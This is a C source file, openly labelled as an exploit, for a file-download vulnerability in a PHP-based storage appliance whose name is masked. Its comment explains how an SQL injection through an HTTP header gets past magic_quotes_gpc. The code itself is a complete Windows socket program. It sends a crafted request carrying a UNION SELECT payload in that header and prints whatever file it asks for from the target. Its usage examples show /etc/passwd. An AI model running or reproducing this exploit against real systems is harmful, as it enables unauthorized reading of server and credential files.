/*
* M*****_FILE_DOWNLOAD_Exploit.c
* 
* Summary:
* $query = "SELECT volumn_path FROM tbl WHERE volumn_name = " . $HEADER['X-***_ID'];
*                                                               ^ exploit point
*
* Rootcause:
* This system is a php-based system.
* Basically, This appliance series can be prevent to various attacks with turned it on magic_quotes_gpc configuration.
* But when the server communicate with clients, its expose from malicious attacks, because using user input data saved from the HTTP header variable.
* The magic_quotes_gpc configuration is able to cover only incoming GET/POST/Cookie data, not any HTTP headers.
* 
* Exploited by 1ndr4 - 2016.01.22
*/
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock.h>

#define BANNER \
"################################################################\n" \
"#                                                              #\n" \
"#   M***** Storage Series File Download Vulnerability Exploit  #\n" \
"#                                                              #\n" \
"#                                           Exploited by 1ndr4 #\n" \
"#                                                   2016.01.22 #\n" \
"#                                                              #\n" \
"################################################################\n"

#pragma comment (lib, "ws2_32.lib")
#pragma comment (lib, "mswsock.lib")
#pragma comment (lib, "advapi32.lib")

#define SENDPKT \
"GET /*********/*******/activeXDownLoad_step3.php HTTP/1.1\r\n" \
"Host: %s\r\n" \
"X-RFILE_NAME: %s\r\n" \
"X-***_ID: 1ndr4' UNION SELECT '/'--\r\n" \
"Connection: Close\r\n\r\n"

unsigned char *get_payload(const char *host, const char *file)
{
	static unsigned char ret[4096];
	
	memset(ret, 0x00, sizeof(ret));
	_snprintf(ret, sizeof(ret) - 1, SENDPKT, host, file);
	return ret;
}

int exploit_check(int s)
{
	char buf[1024];
	char *header;
	int n = 0;
	while(1) {
		if((n = recv(s, buf, sizeof(buf) - 1, MSG_PEEK)) < 0) {
			printf("[!] Failed sending a payload.\n");
			goto failed;
		} else {
			if((header = strstr(buf, "\r\n\r\n")) != NULL) {
				if(strstr(buf, "success trans download file") == NULL) {
					printf("[!] Failed exploit!\n");
					goto failed;
				} else { 
					printf("[*] Exploit Successfully!\n\n");
					recv(s, buf, (header - buf + 4), 0);
					break;
				}
			}
		}
		_sleep(1);
	}
	return 0;

failed:
	return -1;
}


int main(int argc, char **argv)
{
	WSADATA wsa;
	struct hostent *he;
	struct sockaddr_in sin;
	int s = -1, n = 0;
	unsigned char *payload = NULL;
	char buf[1024];

	printf("%s\n", BANNER);
	
	if(argc < 3) {
		printf(
			"Usage: %s <DOMAIN> <FILE_FULL_PATH>\n"
			"Ex) %s www.victim.com /etc/passwd\n"
			"    %s www.victim.com /etc/motd\n", argv[0], argv[0], argv[0]);
		return 0;
	}

	WSAStartup(MAKEWORD(2,2), &wsa);

	printf("[*] TARGET: %s\n", argv[1]);
	if((he = gethostbyname(argv[1])) == NULL) {
		printf("[!] Can't get the host information: %s\n", argv[1]);
		return 0;
	}
	memset(&sin, 0x00, sizeof(sin));
	memcpy(&sin.sin_addr, he->h_addr, he->h_length);
	sin.sin_family = AF_INET;
	sin.sin_port = htons(80);
	
	if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) {
		printf("[!] Can't create a socket: %s\n", argv[1]);
		goto failed;
	}
	printf("[*] FILE: %s\n", argv[2]);
	if(connect(s, (struct sockaddr *)&sin, sizeof(sin)) < 0) {
		printf("[!] Can't connect to server: %s\n", argv[1]);
		goto failed;
	}
	if((payload = get_payload(argv[1], argv[2])) == NULL) {
		printf("[!] Can't get the payload\n");
		goto failed;
	}

	printf("[*] Sending a payload.....\n");
	if(send(s, payload, strlen(payload), 0) < 0) {
		printf("[!] Payload sending error!\n");
		goto failed;
	}

	if(exploit_check(s) == -1)
		goto failed;
	
	printf("------------------ Server %s's %s ------------------\n\n", argv[1], argv[2]);
	while((n = recv(s, buf, sizeof(buf) - 1, 0)) > 0) {
		buf[n] = '\0';
		printf("%s", buf);
	}
failed:
	if(s != -1)
		closesocket(s);
	WSACleanup();
}
